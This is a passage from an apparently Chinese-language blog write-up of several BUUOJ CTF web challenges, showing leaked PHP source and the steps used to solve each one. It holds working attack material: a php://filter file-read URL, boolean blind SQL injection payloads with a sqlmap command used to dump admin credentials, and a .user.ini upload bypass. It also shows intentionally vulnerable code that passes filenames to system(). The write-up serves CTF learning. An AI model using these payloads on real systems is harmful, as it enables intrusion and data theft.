punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$whitelist</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$blacklist</span></span>/is"</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql_query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from `albert_users` where `username_which_you_do_not_know`= '<span class="token interpolation"><span class="token variable">$user</span></span>' and `password_which_you_do_not_know_too` = '<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$res</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>username_which_you_do_not_know<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isadmin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">[</span>isadmin_which_you_do_not_know_too_too<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">updateadmin</span><span class="token punctuation">(</span><span class="token variable">$level</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '<span class="token interpolation"><span class="token variable">$level</span></span>' where `username_which_you_do_not_know`='<span class="token interpolation"><span class="token variable">$user</span></span>' "</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    var_dump($res);</span><span class="token comment">//    die();</span><span class="token comment">//    die($res);</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">register</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">Filter</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('<span class="token interpolation"><span class="token variable">$user</span></span>','<span class="token interpolation"><span class="token variable">$pass</span></span>','0')"</span><span class="token punctuation">;</span>    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">sql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">insert_id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>就这样根据源码的数据…读到了以下界面</p><p><code>config.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ERROR</span> <span class="token operator">|</span> <span class="token class-name">E_WARNING</span> <span class="token operator">|</span> <span class="token class-name">E_PARSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">BASEDIR</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/var/www/html/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$OPERATE_admin</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'userinfo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'upload'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'search'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'manage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$DBHOST</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$DBUSER</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$DBPASS</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Nu1LCTF2018!@#qwe"</span><span class="token punctuation">;</span><span class="token comment">//$DBPASS = "";</span><span class="token variable">$DBNAME</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"N1CTF"</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> @<span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$DBHOST</span><span class="token punctuation">,</span> <span class="token variable">$DBUSER</span><span class="token punctuation">,</span> <span class="token variable">$DBPASS</span><span class="token punctuation">,</span> <span class="token variable">$DBNAME</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no sql connection"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>guest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/guest.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>info.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/info.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>ffffllllaaaaggg</code>被过滤</p><h5 id="利用-parse-url解析漏洞"><a href="#利用-parse-url解析漏洞" class="headerlink" title="利用 parse_url解析漏洞"></a>利用 <code>parse_url</code>解析漏洞</h5><p> 当url种出现下面这种情况的url，会解析错误，返回false<br><code>//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code> </p><p><code>ffffllllaaaaggg.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can find sth in m4aaannngggeee"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><code>m4aaannngggeee.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">FLAG_SIG</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you can not visit it directly"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"templates/upload.html"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>./templates/upload.html</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129211243615.png" class="" title="image-20201129211243615" loading="lazy"><p>赶紧上传个，结果白高兴一场</p><img src="/article/Buuoj-WEB-Write-up/image-20201129211356792.png" class="" title="image-20201129211356792" loading="lazy"><p>利用user.php再读<code>upllloadddd.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowtype</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:can not move"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error:not an upload file！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$newfile</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"file upload success&lt;br />"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$filename</span><span class="token punctuation">;</span><span class="token variable">$picdata</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">" | base64 -w 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/png;base64,"</span><span class="token operator">.</span><span class="token variable">$picdata</span><span class="token operator">.</span><span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Upload file error: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$allowtype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$newfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212543344.png" class="" title="image-20201129212543344" loading="lazy"><p>确认存在文件上传考点，回去找上传点，访问<code>./user.php?page=m4aaannngggeee</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129212613725.png" class="" title="image-20201129212613725" loading="lazy"><p>上传发现</p><img src="/article/Buuoj-WEB-Write-up/image-20201129212720648.png" class="" title="image-20201129212720648" loading="lazy"><p>表明无法通过上传一句话木马获得shell</p><p>后来分析代码发现漏洞</p><h5 id="文件名代码执行漏洞"><a href="#文件名代码执行漏洞" class="headerlink" title="文件名代码执行漏洞"></a>文件名代码执行漏洞</h5><img src="/article/Buuoj-WEB-Write-up/image-20201129212856576.png" class="" title="image-20201129212856576" loading="lazy"><p>扫目录</p><img src="/article/Buuoj-WEB-Write-up/image-20201129213023625.png" class="" title="image-20201129213023625" loading="lazy"><p>flag即在<code>flag_233333</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201129213121552.png" class="" title="image-20201129213121552" loading="lazy"><p>成功</p><hr><h2 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h2><p>打开</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104315913.png" class="" title="image-20201202104315913" loading="lazy"><p>有登陆，尝试登陆界面sql注入</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104343337.png" class="" title="image-20201202104343337" loading="lazy"><p>查看源码，在webpack发现猫腻</p><img src="/article/Buuoj-WEB-Write-up/image-20201202104718292.png" class="" title="image-20201202104718292" loading="lazy"><p>登录界面注入无果<img src="/article/Buuoj-WEB-Write-up/image-20201202104751986.png" class="" title="image-20201202104751986" loading="lazy"></p><p>转<code>content_list.php</code></p><p>发现请求文章时会带id参数，尝试注入</p><img src="/article/Buuoj-WEB-Write-up/image-20201202105153401.png" class="" title="image-20201202105153401" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202105351447.png" class="" title="image-20201202105351447" loading="lazy"><p>确认存在注入</p><p>过滤了<code>+</code> <code>空格</code> <code>and</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201202105230126.png" class="" title="image-20201202105230126" loading="lazy"><p> 输入数据库不存在的id或产生语法时没有回显，初步判断为布尔盲注</p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>写个tamper替换空格等字符</p><pre class="language-bash" data-language="bash"><code class="language-bash">python2 sqlmap.py <span class="token parameter variable">-u</span> <span class="token string">"http://49a772d8-a3af-40d4-89c2-eaa7bc0fb974.node3.buuoj.cn/backend/content_detail.php?id=0"</span>  <span class="token parameter variable">--delay</span><span class="token operator">=</span><span class="token number">0.07</span> <span class="token parameter variable">--dbms</span><span class="token operator">=</span>mysql <span class="token parameter variable">--technique</span><span class="token operator">=</span>B <span class="token parameter variable">--tamper</span><span class="token operator">=</span>mytamper.py --user-agent<span class="token operator">=</span><span class="token string">"chrome"</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--dump</span></code></pre><p>参数：</p><pre class="language-none"><code class="language-none">--delay 延迟注入，网站快速注入会返回429，Too Many Requirements--dbms 数据库类型--technique 注入方式，这里B指bool布尔盲注--tamper 使用的tamper--user-agent 题目判断UA--risk 风险等级--dump 数据库全部拖下来</code></pre><p>运行提示</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> GET parameter <span class="token string">'id'</span> appears to be <span class="token string">'OR boolean-based blind - WHERE or HAVING clause'</span> injectable</code></pre><p>证实为布尔盲注</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110359111.png" class="" title="image-20201202110359111" loading="lazy"><p>发现跑出了数据库名<code>news</code>但跑不出表名</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110529783.png" class="" title="image-20201202110529783" loading="lazy"><p>参考师傅的答案，写脚本开始跑</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>一段一段分析</p><pre class="language-none"><code class="language-none">database() : 数据库(select(database()) : 选择数据库substr函数 : 指截取参数1字符串，从参数2的位置开始截取参数3位substr((select(database())),&#123;&#125;,1) : 指从数据库名第&#123;&#125;的位置截取一位ascii(substr((select(database())),&#123;&#125;,1)) : 指转化为ASCII码值select : 如下图所示select(ascii(substr((select(database())),&#123;&#125;,1))&#x3D;&#123;&#125;) : select ascii&#x3D;&#123;&#125;，判断是否和某个ascii码值相等，如图if(a,1,0) : 相当于三目运算符 :? ,即 a:1?0^ : 异或符</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202112853423.png" class="" title="image-20201202112853423" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202112804610.png" class="" title="image-20201202112804610" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201202112928978.png" class="" title="image-20201202112928978" loading="lazy"><p>很明显，第一个<code>&#123;&#125;</code>指的是数据库名的第i位，第二个<code>&#123;&#125;</code>指对第i的ASCII码值进行比较</p><img src="/article/Buuoj-WEB-Write-up/image-20201202110930572.png" class="" title="image-20201202110930572" loading="lazy"><p>数据库名为<code>news</code>，继续跑表名</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;news&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113058557.png" class="" title="image-20201202113058557" loading="lazy"><p>再跑列名</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;admin&#39;)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201202113123832.png" class="" title="image-20201202113123832" loading="lazy"><p>跑数据了</p><p>payload：</p><pre class="language-none"><code class="language-none">1^if((select(ascii(substr((select(group_concat(id))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#1^if((select(ascii(substr((select(group_concat(is_enable))from(admin)),&#123;&#125;,1))&#x3D;&#123;&#125;)),1,0)^1#</code></pre><p>其实没必要跑那么多，（跑着好玩</p><p>出来表有两行</p><img src="/article/Buuoj-WEB-Write-up/image-20201202113806290.png" class="" title="image-20201202113806290" loading="lazy"><p><code>username</code>：3ab8d14c,dcaf5eed</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114112390.png" class="" title="image-20201202114112390" loading="lazy"><p><code>password</code>：2a790c21,f285e92a</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114324916.png" class="" title="image-20201202114324916" loading="lazy"><p><code>is_enable</code>：0,1</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114435825.png" class="" title="image-20201202114435825" loading="lazy"><p>直接去拿enbale的登陆即可</p><p>表结构是这样的</p><p>数据库名:news</p><p>表名:admin</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>is_enable</th></tr></thead><tbody><tr><td>1</td><td>3ab8d14c</td><td>2a790c21</td><td>0</td></tr><tr><td>2</td><td>dcaf5eed</td><td>f285e92a</td><td>1</td></tr></tbody></table><p>登陆成功</p><img src="/article/Buuoj-WEB-Write-up/image-20201202114303580.png" class="" title="image-20201202114303580" loading="lazy"><hr><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><img src="/article/Buuoj-WEB-Write-up/image-20201203151206446.png" class="" title="image-20201203151206446" loading="lazy"><p>上来很直白，传个码看看</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151245517.png" class="" title="image-20201203151245517" loading="lazy"><p>改后缀</p><img src="/article/Buuoj-WEB-Write-up/image-20201203151428059.png" class="" title="image-20201203151428059" loading="lazy">文件内容还检查，加`GIF98a`可以<img src="/article/Buuoj-WEB-Write-up/image-20201203151803538.png" class="" title="image-20201203151803538" loading="lazy"><p>会返回上传文件夹目录的数组，目录穿越上传不行，php过滤死了，传含码图片，过滤<code>&lt;?</code>，而<code>&lt;%</code>也不解析，路走不通。</p><p>传个<code>.htaccess</code></p><img src="/article/Buuoj-WEB-Write-up/image-20201203152651182.png" class="" title="image-20201203152651182" loading="lazy"><p>但是好像没解析…</p><img src="/article/Buuoj-WEB-Write-up/image-20201203152715211.png" class="" title="image-20201203152715211" loading="lazy"><p>经查询，nginx使用<code>.user.ini</code>自定义设置</p><p>于是传个<code>.user.ini</code></p><pre class="language-ini" data-language="ini"><code class="language-ini">.user.iniGIF89a                  //绕过exif_imagetype()<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">gyy.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。它包含在所有php文件前先执行</span><span class="token key attr-name">auto_append_file</span><span 